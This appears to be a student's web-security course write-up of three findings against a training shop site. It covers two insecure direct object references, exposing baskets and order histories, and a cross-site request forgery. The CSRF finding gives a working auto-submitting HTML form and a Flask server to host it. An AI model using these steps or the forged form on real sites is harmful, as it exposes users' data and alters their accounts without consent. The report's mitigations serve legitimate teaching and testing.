# Web Application Security

## Week 01  

### Authorization Bypass:

#### Wasdat - View Basket

**Title:** Unauthorized user can view other users baskets.

**Description:** Web Application has insecure direct object vulnerability. Application stores unecrypted basket id in session storage when querying basket items from users basket. Changing basket id enables unauthorized user to view other users basket.

**Steps to produce:**  

1. Navigate to `https://wasdat.fi/3000`.
2. Login in to the website.
3. Head to basket.
4. Open developer tools and view `storage` tab.
5. In `storage` tab, select `session storage`.  
    5. You can find attribute `bid` = `basket id`.
6. Change `bid` value for example: `3`. Navigate to any other view in the website and open `basket` again.
7. Other users basket is now visible to you.


* Impact estimation:
    * Low Severity. User can make harm for other users such as add or remove items but can't access any
* Mitigation:
    * Use more complex identifiers, random generated UUIDs for example.
        * See ![4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)
    * Check two parameters: buid and authenticate for which user buid belongs to.

---

#### Main Target - Wasdat.fi

**Title:** Unauthorized user can view other users order history and access address information.

**Description:** Web Application has insecure direct object vulnerability.  Application enables unauthorized user to view other user order history by chaning user id in the url address.

**Steps to produce:**  

1. Navigate to `https://wasdat.fi`.
2. Login in to the website.
3. When logged in hover over dropdown navigation on top left and press `order history`.
4. When viewing your order history, url is: `http://wasdat.fi/user/13/orders`.
5. Change user id to see view other peoples order history. user id `3` exposes the flag.
> `http://wasdat.fi/user/3/orders`
![image](../images/was1.PNG)


* Impact estimation:
    * Low Severity. User can access other users order history and view their address information.
* Mitigation:
    * Use more complex identifiers, random generated UUIDs for example.
        * See ![4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)
    * Check two parameters: buid and authenticate for which user buid belongs to.  
    * Don't include user id in url parameter.

---

#### Main Target - Wasdat.fi

**Title:** Cross Site Forgery - Change victim username 

**Description:** Web Application allows cross site request and is vulnerable for forged websites to send http requests to application. This allows malicious websites execute `http` request towards the website.

**Steps to produce:**  

1. Create a new `html` file.
```html
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Juice Shop Redirect</title>
        <script>
            window.onload = function() {
                document.getElementById("autoSubmitForm").submit();
            }
        </script>
    </head>

    <body>
        <form action="http://wasdat.fi:3000/profile" method="post" id="autoSubmitForm">
            <input name="username" value="ab0197" />
            <input type="submit">
        </form>
    </body>
</html>
```
2. Create a simple python server:

```py
from flask import Flask, render_template

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('form.html')

if __name__ == '__main__':
    app.run(debug=True)
```
3. Start sever `python3 app.py`
4. Victim user is logged in to `http://wasdat.fi:3000` and goes to your url, in this case: `http://127.0.0.1:5000/` his username will be automically changed to `ab0197` and will be directed to his profile page.  

![image](../images/was3.png)


* Impact estimation:
    * Low Severity. User can make harm for other users such as add or remove items but can't access any
* Mitigation:
    * Modify settings endpoint to check for authentication&authorization properly
        * See: https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control.html (good: it's good to be able to provide a link or links that provide more information and guidance)
        * See: https://imaginary-web-framework-targetapp-is-made-with.com/docs/best-practices/authorization (excellent: if you are able, it's great to refer to guidance that is most relevant to target application)

---

